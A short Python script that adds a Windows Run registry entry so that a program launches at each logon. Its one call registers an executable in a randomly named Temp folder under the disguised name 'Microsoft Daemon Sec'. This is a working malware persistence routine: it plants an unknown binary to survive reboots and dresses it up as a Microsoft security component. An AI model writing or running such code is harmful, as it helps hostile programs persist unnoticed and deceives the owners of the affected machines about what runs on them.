def set_autorun(program_name, program_path):
    try:
        import os
        import winreg
        
        if not os.path.isfile(program_path):
            return f"Error"
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, program_path)
        winreg.CloseKey(key)
        
        return f"Success"
    except Exception:
        return f"Error"

result = set_autorun("Microsoft Daemon Sec", r"C:\Temp\05ft8_2lthb4\cython.exe")
print(result)
